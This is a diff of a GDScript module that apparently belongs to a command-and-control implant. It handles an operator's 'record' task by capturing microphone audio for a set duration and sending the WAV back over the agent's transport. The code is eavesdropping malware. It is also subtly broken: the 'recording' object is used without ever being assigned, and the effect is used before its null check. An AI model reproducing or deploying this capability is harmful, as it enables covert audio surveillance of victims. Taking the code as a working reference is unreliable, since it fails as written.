@@ -1,14 +1,11 @@
 extends Node
 
-var api
 var transfer
 
 func _ready():
-	api = $".".get_parent().get_node("api")
 	transfer = $".".get_parent().get_node("transfer")
 
-
-func _on_tasking_record(task):
+func _on_tasking_record(transport, task):
 	var task_id = task.get("id")
 
 	if task.has("command") and task.get("command") == "record":
@@ -17,23 +14,38 @@ func _on_tasking_record(task):
 		var parameters = test_json_conv.get_data()
 		var record_duration = int(parameters.get("duration"))
 		var fail = false
-
+		var effect = null
+		
 		# We get the index of the "Record" bus.
 		var idx = AudioServer.get_bus_index("Record")
-		var effect
-		var recording
-		
+
 		if idx == -1:
-			fail = true
-		# And use it to retrieve its first effect, which has been defined
-		# as an "AudioEffectRecord" resource.
+			
+			var list = AudioServer.get_input_device_list()
+			
+			if list.size() > 1:
+				idx = AudioServer.get_bus_index(list[1])
+				
+				if idx == -1:
+					fail = true
+			else:
+				fail = true
+
 		if not fail:
 			effect = AudioServer.get_bus_effect(idx, 0)
-		
+			effect.set_recording_active(false)
+
+		var recording
+		# And use it to retrieve its first effect, which has been defined
+		# as an "AudioEffectRecord" resource.
+
 		if effect == null:
 			fail = true
 		
 		if not fail:
+			recording.set_mix_rate(44100)
+			recording.set_format(AudioStreamWAV.FORMAT_16_BITS)
+			recording.set_stereo(true)
 			effect.set_recording_active(true)
 			await get_tree().create_timer(record_duration).timeout
 			effect.set_recording_active(false)
@@ -43,10 +55,10 @@ func _on_tasking_record(task):
 				fail = true
 
 		if not fail:
-			transfer.file_tasks[task_id] = FileTransfer.new(task_id, "/recording/%s.wav" % [task_id], FileTransfer.DIRECTION.DOWNLOAD, api, "", recording.data)
+			transfer.file_tasks[task_id] = FileTransfer.new(task_id, "/recording/%s.wav" % [task_id], FileTransfer.DIRECTION.DOWNLOAD, transport, "", recording.data)
 		else:
-			api.send_agent_response(
-				api.create_task_response(
+			transport.send(
+				transport.create_task_response(
 					true,
 					true,
 					task_id,
